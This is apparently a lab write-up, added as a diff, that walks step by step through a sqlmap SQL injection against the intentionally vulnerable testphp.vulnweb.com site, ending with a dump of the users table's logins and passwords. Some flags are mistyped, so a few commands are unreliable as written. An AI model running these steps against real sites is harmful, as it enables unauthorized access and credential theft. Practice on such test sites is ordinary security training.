@@ -1,3 +1,21 @@
 To perform the attack I have used 'Kali Linux' as my host OS and used a built in tool 'SqlMap' to find the vulnerabilities.
 
 STEP 1 : I have used "Acuart" to conduct the attack, initilaiiy I crawled the website using the following command
+         "sqlmap -u http://testphp.vulnweb.com/ --crawl 2"
+
+STEP 2 : This crawls the website and finds the possible vulnerabilities present in the code, it then exports these links in the CSV file (uploaded in the folder). 
+         Now we can use these entry points to exploit the vulnerability.
+         
+STEP 3 : Checking the exported file we can see the following entry 
+         "http://testphp.vulnweb.com/listproducts.php?cat=1,GET,cat,BETU,"
+         we will use the "cat=1" to exploit it
+
+STEP 4 : Entering the command "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs". Shows us the list of all databases available.
+
+STEP 5 : Now since we have acquired the name of the database, we can use this to check all the tables present in the database by entering
+         "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart tables"
+
+STEP 6 : As a result of above command, all of the tables are now visible to us. Well use the "users" table to find the users login and password
+
+STEP 7 : Entering the command "sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users --dump". Gives us the details of all users 
+         present in the database. We can use this information to login. 
